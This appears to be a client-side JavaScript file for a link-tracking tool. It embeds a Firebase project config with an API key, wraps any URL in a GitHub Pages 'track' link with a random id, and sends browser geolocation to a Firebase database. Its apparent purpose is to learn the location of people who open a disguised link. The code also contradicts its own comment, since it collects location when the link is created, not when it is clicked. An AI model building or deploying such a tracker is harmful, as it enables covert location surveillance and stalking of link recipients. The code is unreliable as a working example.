const firebaseConfig = {
    apiKey: "AIzaSyBb_fTtLdRVHXmK8SDqrb2Cmfz66JdTxxI",
    authDomain: "projeto-68121.firebaseapp.com",
    projectId: "projeto-68121",
    storageBucket: "projeto-68121.firebasestorage.app",
    messagingSenderId: "39923570106",
    appId: "1:39923570106:web:dd1108773c2d087cebb983",
    measurementId: "G-1G1F8RQRN6"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

const urlInput = document.getElementById('urlInput');
const createLinkButton = document.getElementById('createLinkButton');
const trackingLink = document.getElementById('trackingLink');

createLinkButton.addEventListener('click', () => {
    const url = urlInput.value;
    const trackingId = generateTrackingId();
    const trackingUrl = `https://lavinia0cristine0souza.github.io/lavinia_criistine/track?id=${trackingId}&url=${encodeURIComponent(url)}`; // Nome do repositório corrigido
    trackingLink.textContent = trackingUrl;

    // Colete os dados de localização apenas quando o usuário clicar no link
    getLocation();
});

function generateTrackingId() {
    return Math.random().toString(36).substring(2, 15);
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            const { latitude, longitude } = position.coords;
            sendLocationToFirebase(latitude, longitude);
        });
    }
}

function sendLocationToFirebase(latitude, longitude) {
    database.ref('locations/').push({
        latitude: latitude,
        longitude: longitude,
        timestamp: Date.now()
    });
}
